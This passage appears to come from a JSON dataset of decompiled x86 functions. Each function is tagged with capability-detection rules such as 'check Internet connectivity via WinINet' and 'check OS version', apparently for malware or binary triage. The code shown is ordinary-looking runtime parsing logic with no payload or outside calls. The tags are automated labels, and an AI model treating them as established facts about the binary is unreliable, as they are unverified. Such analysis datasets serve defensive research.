if (cVar3 == ' ') {\ncode_r0x004728ae:\n            if (*(unaff_EBP + -0x84) != 3) {\n                *(unaff_EBP + -0x5a) = 0;\n                cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n                if (cVar3 == '\\0') {\n                    uVar7 = *(unaff_EBP + -0x68);\n                    do {\n                        if (*(iVar13 + 4) == '\\0') {\n                            fcn.00405c40();\n                        }\n                        pcVar1 = *(*piVar5 + 0x10);\n                        (**0x573000)(0x48, *(iVar13 + 6));\n                        cVar3 = (*pcVar1)();\n                        if (cVar3 == '\\0') break;\n                        *(unaff_EBP + -0x5a) = 1;\n                        fcn.004047a5();\n                        cVar3 = fcn.00401a9b(uVar7);\n                        piVar5 = *(unaff_EBP + -0x98);\n                    } while (cVar3 == '\\0');\n                    uVar16 = *(unaff_EBP + -0x70);\n                }\n                if ((*(unaff_EBP + -0x9c + *(unaff_EBP + -0x84)) == ' ') && (*(unaff_EBP + -0x5a) == '\\0')) {\n                    cVar3 = '\\x01';\n                    *(unaff_EBP + -0x59) = 1;\n                    goto code_r0x0047209f;\n                }\n            }\ncode_r0x0047209c:\n            cVar3 = *(unaff_EBP + -0x59);\n        }\n        else {\n            if (cVar3 == '$') {\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x18);\n                (**0x573000)(unaff_EBP + -0x28);\n                (*pcVar1)();\n                uVar16 = uVar16 | 0x80;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                uVar7 = *(unaff_EBP + -0x68);\n                *(unaff_EBP + -4) = 7;\n                if (((*(*(unaff_EBP + -0x88) + 0x14) & 8) == 0) &&\n                   (cVar3 = fcn.00401a9b(uVar7),  var_14h = uVar7,  cVar3 == '\\0')) {\n                    if (*(iVar13 + 4) == '\\0') {\n                        fcn.00405c40();\n                    }\n                    piVar11 = unaff_EBP + -0x28;\n                    if (7 < *(unaff_EBP + -0x14)) {\n                        piVar11 = *(unaff_EBP + -0x28);\n                    }\n                    if (*(iVar13 + 6) == *piVar11) goto code_r0x004727d5;\ncode_r0x00472811:\n                    puVar12 = unaff_EBP + -0x28;\n                    if (7 < *(unaff_EBP + -0x14)) {\n                        puVar12 = *(unaff_EBP + -0x28);\n                    }\n                    *(unaff_EBP + -0x18) = 0;\n                    *puVar12 = 0;\n                    var_14h = uVar7;\n                }\n                else {\ncode_r0x004727d5:\n                    if ((*(unaff_EBP + -0x84) == 3) && (*(unaff_EBP + -0x48) < 2)) {\n                        cVar3 = fcn.00401a9b(uVar7);\n                        if (cVar3 == '\\0') {\n                            if (*(iVar13 + 4) == '\\0') {\n                                fcn.00405c40();\n                            }\n                            piVar11 = unaff_EBP + -0x28;\n                            if (7 < *(unaff_EBP + -0x14)) {\n                                piVar11 = *(unaff_EBP + -0x28);\n                            }\n                            var_14h = uVar7;\n                            if (*(iVar13 + 6) == *piVar11) goto code_r0x00472826;\n                        }\n                        goto code_r0x00472811;\n                    }\n                }\ncode_r0x00472826:\n                piVar11 = unaff_EBP + -0x28;\n                if (7 < *(unaff_EBP + -0x14)) {\n                    piVar11 = *(unaff_EBP + -0x28);\n                }\n                var_18h = *(unaff_EBP + -0x68);\n                cVar3 = fcn.00401a9b(var_18h);\n                if (cVar3 == '\\0') {\n                    iVar18 = *(unaff_EBP + -0x68);\n                    do {\n                        iVar10 = unaff_EBP + -0x28;\n                        if (7 < *(unaff_EBP + -0x14)) {\n                            iVar10 = *(unaff_EBP + -0x28);\n                        }\n                        if (piVar11 == iVar10 + *(unaff_EBP + -0x18) * 2) break;\n                        if (*(iVar13 + 4) == '\\0') {\n                            fcn.00405c40();\n                        }\n                        if (*(iVar13 + 6) != *piVar11) break;\n                        piVar11 = piVar11 + 1;\n                        fcn.004047a5();\n                        cVar3 = fcn.00401a9b(iVar18);\n                        var_18h = iVar18;\n                    } while (cVar3 == '\\0');\n                    uVar16 = *(unaff_EBP + -0x70);\n                }\n                iVar18 = unaff_EBP + -0x28;\n                if (7 < *(unaff_EBP + -0x14)) {\n                    iVar18 = *(unaff_EBP + -0x28);\n                }\n                if (piVar11 != iVar18 + *(unaff_EBP + -0x18) * 2) {\n                    *(unaff_EBP + -0x59) = 1;\n                }\n                *(unaff_EBP + -4) = 4;\ncode_r0x004725aa:\n                fcn.00405ad3(var_18h, var_14h);\n                goto code_r0x0047209c;\n            }\n            if (cVar3 != '+') {\n                if (cVar3 != 'v') {\n                    if (cVar3 == 'x') goto code_r0x004728ae;\n                    goto code_r0x0047209c;\n                }\n                piVar5 = *(unaff_EBP + -0x60);\n                *(unaff_EBP + -0x7c) = 0;\n                uVar7 = fcn.004013e8();\n                *(unaff_EBP + -0x80) = uVar7;\n                pcVar1 = *(*piVar5 + 0x14);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                uVar16 = uVar16 | 0x10000;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                *(unaff_EBP + -4) = 0xd;\n                if (*(unaff_EBP + -0x30) == 0) {\ncode_r0x00472334:\n                    var_14h = *(unaff_EBP + -0x68);\n                    cVar3 = fcn.00401a9b(var_14h);\n                    if (cVar3 == '\\0') {\n                        do {\n                            if (*(iVar13 + 4) == '\\0') {\n                                fcn.00405c40();\n                            }\n                            uVar6 = fcn.00403724(*(unaff_EBP + -0x94), *(iVar13 + 6));\n                            if (9 < uVar6) break;\n                            *(unaff_EBP + -0xa4) = *(uVar6 + 0x54e450);\n                            fcn.00404476(*(unaff_EBP + -0xa4));\n                            fcn.004047a5();\n                            cVar3 = fcn.00401a9b(var_14h);\n                        } while (cVar3 == '\\0');\n                        uVar16 = *(unaff_EBP + -0x70);\n                    }\ncode_r0x00472399:\n                    iVar4 = fcn.00404f84();\n                    cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n                    if ((cVar3 == '\\0') && (iVar4 != 0)) {\n                        if (*(iVar13 + 4) == '\\0') {\n                            fcn.00405c40();\n                        }\n                        if (*(iVar13 + 6) != iVar4) goto code_r0x0047245a;\n                        fcn.004047a5();\n                        cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n                        iVar18 = *(unaff_EBP + -0x80);\n                        while (iVar10 = *(unaff_EBP + -0x7c),  cVar3 == '\\0') {\n                            if (iVar18 <= iVar10) goto code_r0x00472460;\n                            if (*(iVar13 + 4) == '\\0') {\n                                fcn.00405c40();\n                            }\n                            uVar6 = fcn.00403724(*(unaff_EBP + -0x94), *(iVar13 + 6));\n                            if (9 < uVar6) {\n                                iVar10 = *(unaff_EBP + -0x7c);\n                                goto code_r0x00472454;\n                            }\n                            *(unaff_EBP + -0xa8) = *(uVar6 + 0x54e450);\n                            fcn.00404476(*(unaff_EBP + -0xa8));\n                            *(unaff_EBP + -0x7c) = *(unaff_EBP + -0x7c) + 1;\n                            fcn.004047a5();\n                            cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n                        }\n                        if (iVar10 < iVar18) {\ncode_r0x00472454:\n                            *(unaff_EBP + -0x59) = 1;\n                        }\n                    }\n                    else {\ncode_r0x0047245a:\n                        iVar18 = *(unaff_EBP + -0x80);\n                        iVar10 = *(unaff_EBP + -0x7c);\n                    }\ncode_r0x00472460:\n                    if (*(*(unaff_EBP + -0x78) + 0x10) == 0) {\n                        *(unaff_EBP + -0x59) = 1;\n                    }\n                    else if (iVar10 < iVar18) {\n                        iVar18 = iVar18 - iVar10;\n                        do {\n                            fcn.00404476(0x30);\n                            iVar18 = iVar18 + -1;\n                        } while (iVar18 != 0);\n                        iVar13 = *(unaff_EBP + -0xac);\n                    }\n                }\n                else {\n                    uVar6 = fcn.004042a5();\n                    *(unaff_EBP + -0x74) = uVar6 & 0xffff;\n                    if ((uVar6 & 0xffff) == 0) goto code_r0x00472334;\n                    puVar8 = unaff_EBP + -0x40;\n                    if (0xf < *(unaff_EBP + -0x2c)) {\n                        puVar8 = *(unaff_EBP + -0x40);\n                    }\n                    if (0x7e < *puVar8) goto code_r0x00472334;\n                    *(unaff_EBP + -0x28) = 0;\n                    *(unaff_EBP + -0x18) = 0;\n                    *(unaff_EBP + -0x14) = 0xf;\n                    *(unaff_EBP + -0x28) = 0;\n                    var_14h = 0;\n                    *(unaff_EBP + -4) = 0xf;\n                    fcn.00404476(0);\n                    iVar18 = 0;\n                    cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n                    if (cVar3 == '\\0') {\n                        iVar10 = *(unaff_EBP + -0x28);\n                        *(unaff_EBP + -0x6c) = iVar10;\n                        do {\n                            if (*(iVar13 + 4) == '\\0') {\n                                fcn.00405c40();\n                            }\n                            uVar6 = fcn.00403724(*(unaff_EBP + -0x94), *(iVar13 + 6));\n                            if (uVar6 < 10) {\n                                *(unaff_EBP + -0xa0) = *(uVar6 + 0x54e450);\n                                fcn.00404476(*(unaff_EBP + -0xa0));\n                                iVar9 = unaff_EBP + -0x28;\n                                if (0xf < *(unaff_EBP + -0x14)) {\n                                    iVar9 = iVar10;\n                                }\n                                if (*(iVar9 + iVar18) != '\\x7f') {\n                                    iVar9 = unaff_EBP + -0x28;\n                                    if (0xf < *(unaff_EBP + -0x14)) {\n                                        iVar9 = iVar10;\n                                    }\n                                    *(iVar9 + iVar18) = *(iVar9 + iVar18) + '\\x01';\n                                    goto code_r0x004721fd;\n                                }\n                            }\n                            else {\n                                iVar9 = unaff_EBP + -0x28;\n                                if (0xf < *(unaff_EBP + -0x14)) {\n                                    iVar9 = iVar10;\n                                }\n                                if (*(iVar9 + iVar18) == '\\0') break;\n                                iVar4 = *(iVar13 + 6);\n                                if (*(iVar13 + 4) == '\\0') {\n                                    fcn.00405c40();\n                                    iVar4 = *(iVar13 + 6);\n                                }\n                                if (iVar4 != *(unaff_EBP + -0x74)) break;\n                                fcn.00404476(0);\n                                iVar18 = iVar18 + 1;\ncode_r0x004721fd:\n                                iVar10 = *(unaff_EBP + -0x28);\n                                *(unaff_EBP + -0x6c) = iVar10;\n                            }\n                            fcn.004047a5();\n                            cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n                        } while (cVar3 == '\\0');\n                        uVar16 = *(unaff_EBP + -0x70);\n                        if (iVar18 == 0) {\n                            arg_8h_00 = *(unaff_EBP + -0x6c);\n                            goto code_r0x0047224a;\n                        }\n                        iVar10 = unaff_EBP + -0x28;\n                        if (0xf < *(unaff_EBP + -0x14)) {\n                            iVar10 = *(unaff_EBP + -0x6c);\n                        }\n                        arg_8h_00 = *(unaff_EBP + -0x6c);\n                        if ('\\0' < *(iVar10 + iVar18)) {\n                            iVar18 = iVar18 + 1;\n                            goto code_r0x0047224a;\n                        }\n                        cVar3 = '\\x01';\n                        *(unaff_EBP + -0x59) = 1;\n                    }\n                    else {\n                        arg_8h_00 = *(unaff_EBP + -0x28);\ncode_r0x0047224a:\n                        cVar3 = *(unaff_EBP + -0x59);\n                    }\n                    pcVar15 = unaff_EBP + -0x40;\n                    *(unaff_EBP + -0x6c) = pcVar15;\n                    if (0xf < *(unaff_EBP + -0x2c)) {\n                        pcVar15 = *(unaff_EBP + -0x40);\n                        *(unaff_EBP + -0x6c) = pcVar15;\n                    }\n                    if (cVar3 == '\\0') {\n                        while ((iVar18 != 0 && (cVar3 = *pcVar15,  cVar3 != '\\x7f'))) {\n                            iVar18 = iVar18 + -1;\n                            if (iVar18 != 0) {\n                                pcVar15 = unaff_EBP + -0x28;\n                                if (0xf < *(unaff_EBP + -0x14)) {\n                                    pcVar15 = arg_8h_00;\n                                }\n                                if (cVar3 == pcVar15[iVar18]) goto code_r0x0047228b;\ncode_r0x004722ad:\n                                *(unaff_EBP + -0x59) = 1;\n                                goto code_r0x004722b1;\n                            }\ncode_r0x0047228b:\n                            if (iVar18 == 0) {\n                                pcVar15 = unaff_EBP + -0x28;\n                                if (0xf < *(unaff_EBP + -0x14)) {\n                                    pcVar15 = arg_8h_00;\n                                }\n                                if (cVar3 < *pcVar15) goto code_r0x004722ad;\n                            }\n                            pcVar15 = *(unaff_EBP + -0x6c);\n                            if ('\\0' < pcVar15[1]) {\n                                pcVar15 = pcVar15 + 1;\n                                *(unaff_EBP + -0x6c) = pcVar15;\n                            }\n                        }\n                        *(unaff_EBP + -4) = 0xd;\n                        if (0xf < *(unaff_EBP + -0x14)) {\n                            uVar6 = *(unaff_EBP + -0x14) + 1;\n                            *(unaff_EBP + -0x74) = arg_8h_00;\n                            *(unaff_EBP + -0x6c) = uVar6;\n                            if (0xfff < uVar6) {\n                                fcn.00404070(unaff_EBP + -0x74, unaff_EBP + -0x6c);\n                                arg_8h_00 = *(unaff_EBP + -0x74);\n                            }\n                            fcn.00401a32(arg_8h_00);\n                        }\n                        goto code_r0x00472399;\n                    }\ncode_r0x004722b1:\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        uVar6 = *(unaff_EBP + -0x14) + 1;\n                        *(unaff_EBP + -0x80) = arg_8h_00;\n                        *(unaff_EBP + -0x74) = uVar6;\n                        if (0xfff < uVar6) {\n                            fcn.00404070(unaff_EBP + -0x80, unaff_EBP + -0x74);\n                            arg_8h_00 = *(unaff_EBP + -0x80);\n                        }\n                        fcn.00401a32(arg_8h_00);\n                    }\n                }\n                *(unaff_EBP + -4) = 4;\n                fcn.004029b9();\n                goto code_r0x0047209c;\n            }\n            cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n            if (cVar3 != '\\0') goto code_r0x0047209c;\n            pcVar1 = *(**(unaff_EBP + -0x60) + 0x1c);\n            (**0x573000)(unaff_EBP + -0x28);\n            (*pcVar1)();\n            uVar6 = uVar16 | 0x102;\n            *(unaff_EBP + -4) = 8;\n            *(unaff_EBP + -100) = uVar6;\n            if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x0047252b:\n                *(unaff_EBP + -0x5a) = 0;\n            }\n            else {\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x1c);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                uVar6 = uVar16 | 0x306;\n                *(unaff_EBP + -4) = 9;\n                piVar11 = unaff_EBP + -0x40;\n                *(unaff_EBP + -100) = uVar6;\n                if (7 < *(unaff_EBP + -0x2c)) {\n                    piVar11 = *(unaff_EBP + -0x40);\n                }\n                if (*(iVar13 + 4) == '\\0') {\n                    fcn.00405c40();\n                }\n                iVar4 = *(iVar13 + 6);\n                *(unaff_EBP + -0x5a) = 1;\n                if (*piVar11 != iVar4) goto code_r0x0047252b;\n            }\n            if ((uVar6 & 4) != 0) {\n                uVar6 = uVar6 & 0xfffffffb;\n                *(unaff_EBP + -100) = uVar6;\n                fcn.00405ad3();\n            }\n            *(unaff_EBP + -4) = 4;\n            if ((uVar6 & 2) != 0) {\n                uVar6 = uVar6 & 0xfffffffd;\n                *(unaff_EBP + -100) = uVar6;\n                fcn.00405ad3();\n            }\n            if (*(unaff_EBP + -0x5a) != '\\0') {\n                fcn.004047a5();\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x1c);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                *(unaff_EBP + -0xb0) = 0;\n                var_18h = unaff_EBP + -0x40;\n                var_14h = *(unaff_EBP + -0xb0);\n                uVar16 = uVar6 | 0x400;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                fcn.00404872(var_18h);\n                goto code_r0x004725aa;\n            }\n            pcVar1 = *(**(unaff_EBP + -0x60) + 0x20);\n            (**0x573000)(unaff_EBP + -0x28);\n            (*pcVar1)();\n            uVar17 = uVar6 | 0x808;\n            *(unaff_EBP + -4) = 10;\n            *(unaff_EBP + -100) = uVar17;\n            if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x00472635:\n                *(unaff_EBP + -0x5a) = 0;\n            }\n            else {\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x20);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                uVar17 = uVar6 | 0x1818;\n                *(unaff_EBP + -4) = 0xb;\n                piVar11 = unaff_EBP + -0x40;\n                *(unaff_EBP + -100) = uVar17;\n                if (7 < *(unaff_EBP + -0x2c)) {\n                    piVar11 = *(unaff_EBP + -0x40);\n                }\n                if (*(iVar13 + 4) == '\\0') {\n                    fcn.00405c40();\n                }\n                iVar4 = *(iVar13 + 6);\n                *(unaff_EBP + -0x5a) = 1;\n                if (*piVar11 != iVar4) goto code_r0x00472635;\n            }\n            if ((uVar17 & 0x10) != 0) {\n                uVar17 = uVar17 & 0xffffffef;\n                *(unaff_EBP + -100) = uVar17;\n                fcn.00405ad3();\n            }\n            *(unaff_EBP + -4) = 4;\n            if ((uVar17 & 8) != 0) {\n                uVar17 = uVar17 & 0xfffffff7;\n                *(unaff_EBP + -100) = uVar17;\n                fcn.00405ad3();\n            }\n            if (*(unaff_EBP + -0x5a) != '\\0') {\n                fcn.004047a5();\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x20);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                *(unaff_EBP + -0x8c) = 0;\n                var_14h = *(unaff_EBP + -0x8c);\n                uVar16 = uVar17 | 0x2000;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                fcn.00404872(unaff_EBP + -0x40);\n                fcn.00405ad3(unaff_EBP + -0x40, var_14h);\n                *(unaff_EBP + -0x5b) = 1;\n                goto code_r0x0047209c;\n            }\n            pcVar1 = *(**(unaff_EBP + -0x60) + 0x1c);\n            (**0x573000)(unaff_EBP + -0x28);\n            (*pcVar1)();\n            uVar16 = uVar17 | 0x4020;\n            *(unaff_EBP + -4) = 0xc;\n            *(unaff_EBP + -0x70) = uVar16;\n            *(unaff_EBP + -100) = uVar16;\n            if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x00472723:\n                *(unaff_EBP + -0x5a) = 0;\n            }\n            else {\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x20);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                uVar16 = uVar17 | 0xc060;\n                *(unaff_EBP + -0x5a) = 1;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                if (*(unaff_EBP + -0x30) != 0) goto code_r0x00472723;\n            }\n            if ((uVar16 & 0x40) != 0) {\n                uVar16 = uVar16 & 0xffffffbf;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                fcn.00405ad3();\n            }\n            *(unaff_EBP + -4) = 4;\n            if ((uVar16 & 0x20) != 0) {\n                uVar16 = uVar16 & 0xffffffdf;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                fcn.00405ad3();\n            }\n            cVar3 = *(unaff_EBP + -0x59);\n            if (*(unaff_EBP + -0x5a) != '\\0') {\n                *(unaff_EBP + -0x5b) = 1;\n            }\n        }\ncode_r0x0047209f:\n        *(unaff_EBP + -0x84) = *(unaff_EBP + -0x84) + 1;\n        uVar6 = *(unaff_EBP + -0x84);\n        piVar5 = *(unaff_EBP + -0x98);\n    } while (cVar3 == '\\0');\n    goto code_r0x004729be;\ncode_r0x00472963:\n    piVar11 = piVar11 + 1;\n    iVar18 = unaff_EBP + -0x58;\n    if (7 < *(unaff_EBP + -0x44)) {\n        iVar18 = *(unaff_EBP + -0x58);\n    }\n    if (piVar11 == iVar18 + uVar6 * 2) goto code_r0x004729ab;\n    cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n    if (cVar3 != '\\0') goto code_r0x004729a8;\n    if (*(iVar13 + 4) == '\\0') {\n        fcn.00405c40();\n    }\n    if (*(iVar13 + 6) != *piVar11) goto code_r0x004729a8;\n    fcn.004047a5();\n    uVar6 = *(unaff_EBP + -0x48);\n    goto code_r0x00472963;\ncode_r0x004729a8:\n    uVar6 = *(unaff_EBP + -0x48);\ncode_r0x004729ab:\n    iVar13 = unaff_EBP + -0x58;\n    if (7 < *(unaff_EBP + -0x44)) {\n        iVar13 = *(unaff_EBP + -0x58);\n    }\n    if (piVar11 == iVar13 + uVar6 * 2) {\ncode_r0x004729d4:\n        if (*(unaff_EBP + -0x5b) != '\\0') {\n            fcn.00405736(0, 1, 0x2d);\n        }\n        goto code_r0x004729ea;\n    }\ncode_r0x004729be:\n    puVar2 = *(unaff_EBP + -0x78);\n    puVar14 = puVar2;\n    if (0xf < puVar2[5]) {\n        puVar14 = *puVar2;\n    }\n    puVar2[4] = 0;\n    *puVar14 = 0;\ncode_r0x004729ea:\n    if (7 < *(unaff_EBP + -0x44)) {\n        uVar7 = *(unaff_EBP + -0x58);\n        uVar6 = *(unaff_EBP + -0x44) * 2 + 2;\n        *(unaff_EBP + -0x88) = uVar6;\n        *(unaff_EBP + -0x74) = uVar7;\n        if (0xfff < uVar6) {\n            fcn.00404070(unaff_EBP + -0x74, unaff_EBP + -0x88);\n            uVar7 = *(unaff_EBP + -0x74);\n        }\n        fcn.00401a32(uVar7);\n    }\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 8413
    },
    "0040232e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.0040232e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    uint extraout_ECX;\n    char *pcVar7;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(0x10);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    fcn.0040327e(*(*(unaff_EBP + 0x1c) + 0x30));\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.00403d87(unaff_EBP + -0x1c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x10) = piVar5;\n    fcn.004050a6();\n    pcVar7 = *(unaff_EBP + 0x28);\n    puVar1 = *(unaff_EBP + 0x20);\n    do {\n        cVar4 = *pcVar7;\n        if (cVar4 == '\\0') {\ncode_r0x00470023:\n            cVar4 = fcn.0040640b(unaff_EBP + 0x14);\n            if (cVar4 != '\\0') {\n                *puVar1 = *puVar1 | 1;\n            }\n            puVar6 = *(unaff_EBP + 8);\n            uVar3 = *(unaff_EBP + 0x10);\n            *puVar6 = *(unaff_EBP + 0xc);\n            puVar6[1] = uVar3;\n            fcn.0040113b();\n            return;\n        }\n        if (cVar4 == '%') {\n            pcVar7 = pcVar7 + 1;\n            pcVar2 = *(**(unaff_EBP + -0x14) + 0x24);\n            (**0x573000)(unaff_EBP + -0x1c, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                         *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), puVar1, *(unaff_EBP + 0x24), *pcVar7, 0);\n            puVar6 = (*pcVar2)();\n            uVar3 = puVar6[1];\n            *(unaff_EBP + 0xc) = *puVar6;\n            *(unaff_EBP + 0x10) = uVar3;\n        }\n        else if (cVar4 == ' ') {\n            cVar4 = fcn.0040640b(unaff_EBP + 0x14);\n            while (cVar4 == '\\0') {\n                if (*(unaff_EBP + 0x10) == '\\0') {\n                    fcn.004050a1();\n                }\n                pcVar2 = *(*piVar5 + 0x10);\n                (**0x573000)(0x48, *(unaff_EBP + 0x12));\n                cVar4 = (*pcVar2)();\n                if (cVar4 == '\\0') break;\n                fcn.004027a2();\n                cVar4 = fcn.0040640b(unaff_EBP + 0x14);\n                piVar5 = *(unaff_EBP + -0x10);\n            }\n        }\n        else {\n            if (*(unaff_EBP + 0x10) == '\\0') {\n                fcn.004050a1();\n            }\n            pcVar2 = *(*piVar5 + 0x38);\n            (**0x573000)(*(unaff_EBP + 0x12), 0);\n            cVar4 = (*pcVar2)();\n            if (cVar4 != *pcVar7) {\n                *puVar1 = *puVar1 | 2;\n                goto code_r0x00470023;\n            }\n            fcn.004027a2();\n        }\n        piVar5 = *(unaff_EBP + -0x10);\n        pcVar7 = pcVar7 + 1;\n    } while( true );\n}\n",
        "token_count": 1093
    },
    "00402379": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402379(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if (arg_8h != 0) {\n        iVar1 = fcn.004051dc(8);\n        if (iVar1 == 0) {\n            *in_ECX = 0;\n        }\n        else {\n            iVar1 = fcn.004038ff(arg_8h);\n            *in_ECX = iVar1;\n            if (iVar1 != 0) {\n                return;\n            }\n        }\n    }\n    *(in_ECX + 1) = 3;\n    return;\n}\n",
        "token_count": 165
    },
    "004023d3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004023d3(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    \n    *(param_1 + 0x458) = *(param_1 + 0x458) + 1;\n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if ((iVar1 != 3) && ((iVar1 != 2 || (*(param_1 + 0x45c) != 1)))) {\n        *(param_1 + 0xaa4) = 0xffffffff;\n        *(param_1 + 0xaa8) = 0xffffffff;\n        *(param_1 + 0x45c) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0x28) = 0;\n        *(param_1 + 0x10) = *(param_1 + 0x460);\n        return CONCAT31(Var2, 1);\n    }\n    return Var2 << 8;\n}\n",
        "token_count": 241
    },
    "0040240a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040240a(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040288d(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 299
    },
    "004024c3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004024c3(int32_t *arg_8h, uint16_t **arg_ch, int32_t *arg_10h)\n\n{\n    bool bVar1;\n    bool bVar2;\n    char cVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint16_t *puVar8;\n    uint16_t uVar9;\n    int32_t *piVar10;\n    uint16_t *puVar11;\n    uint16_t uVar12;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint16_t *var_14h;\n    int32_t *var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    char var_2h;\n    uint var_1h;\n    \n    cVar3 = fcn.004025db();\n    if (cVar3 == '\\0') {\n        return 7;\n    }\n    puVar11 = *arg_ch;\n    uVar12 = *puVar11;\n    puVar8 = puVar11;\n    while( true ) {\n        var_8h = var_8h & 0xffff0000 | uVar12;\n        *arg_ch = puVar8 + 1;\n        iVar5 = 